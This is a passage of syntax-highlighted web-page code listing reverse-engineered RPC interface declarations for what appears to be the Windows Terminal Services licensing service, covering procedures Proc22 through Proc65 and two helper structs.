class="type">error_status_t</span> <span class="title function_">Proc22_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out][ref] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,0)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span>** arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc23_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [out][ref] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span> <span class="comment">/*[range(0,0)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span>** arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc24_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc25_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc26_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span> arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">char</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_6)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc27_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc28_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_3)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">char</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_6)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc29_RdlsJetDBConnection__CleanupKeyPackDescriptions</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc30_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc31_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc32_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc33_RdlsJetDBConnection__CleanupKeyPackDescriptions</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc34_TLSRpcRequestTermServCert</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][ref]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc35_TLSRpcRetrieveTermServCert</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc36_TLSRpcInstallCertificate</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_3)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_4,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_5)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_6,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_7)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc37_TLSRpcGetServerCertificate</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc38_TLSRpcRegisterLicenseKeyPack</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_2)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_4)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_5,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_7)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc39_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc40_TLSRpcAnnounceServer</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_6)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc41_TLSRpcLookupServer</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_6,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_7,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_8)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc42_TLSRpcAnnounceLicensePack</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc43_TLSRpcReturnLicensedProduct</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uknow1</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> f1;</span><br><span class="line">        <span class="type">int</span> f2;</span><br><span class="line">        <span class="type">int</span> f3;</span><br><span class="line">        <span class="type">int</span> f4;</span><br><span class="line">        [size_is(f3)] <span class="type">unsigned</span> <span class="type">char</span>* buff;</span><br><span class="line">        <span class="type">int</span> f18;</span><br><span class="line">        <span class="type">int</span> f1c;</span><br><span class="line">        [size_is(f18)] <span class="type">unsigned</span> <span class="type">char</span>* buff2;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uknow2</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> f1;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        [size_is(size)]<span class="type">char</span>* buff;</span><br><span class="line">        <span class="type">int</span> size2;</span><br><span class="line">        [size_is(size2)]<span class="type">char</span>* buff2;</span><br><span class="line">        <span class="type">int</span> f1c;<span class="comment">// pad</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc44_TLSRpcChallengeServer</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="keyword">struct</span> uknow1* arg_2,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="keyword">struct</span> uknow2** arg_3,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="keyword">struct</span> uknow1** arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc45_TLSRpcResponseServerChallenge</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc46_TLSRpcGetTlsPrivateData</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out][ref] <span class="type">char</span>** arg_4,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc47_TLSRpcSetTlsPrivateData</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc48_TLSRpcTriggerReGenKey</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc49_TLSRpcTelephoneRegisterLKP</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc50_TLSRpcAllocateInternetLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_5)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_6,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_7,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_8,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_9)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc51_TLSRpcAllocateInternetLicenseEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_5)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_6,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_7,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_8)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc52_TLSRpcReturnInternetLicenseEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc53_TLSRpcReturnInternetLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc54_TLSRpcRequestNewLicenseEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_9,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_10,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_11,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_12)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc55_TLSRpcUpgradeLicenseEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_4,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_4)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_9,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_10,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_11)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc56_TLSRpcMarkLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_2)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc57_TLSRpcCheckLicenseMark</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc58_TLSRpcGetSupportFlags</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc59_TLSRpcRequestNewLicenseExEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_5,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_6,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_6)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_7,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_8,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_9,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_10,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_11,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_12,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_13)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc60_TLSRpcGetServerNameEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc61_TLSRpcLicenseEnumNextEx</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc62_TLSRpcGenerateCustomerCert</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in] <span class="comment">/* [DBG] FC_BOGUS_ARRAY */</span>[size_is(arg_2)]<span class="comment">/*[range(0,0)]*/</span>  <span class="comment">/*  */</span> <span class="type">char</span> arg_3[],</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_4,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_5,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_6)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc63_TLSRpcGetServerNameFixed</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc64_TLSRpcGetServerScopeFixed</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc65_TLSRpcGetLastErrorFixed</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out][ref][<span class="built_in">string</span>] <span class="type">wchar_t</span>** arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title 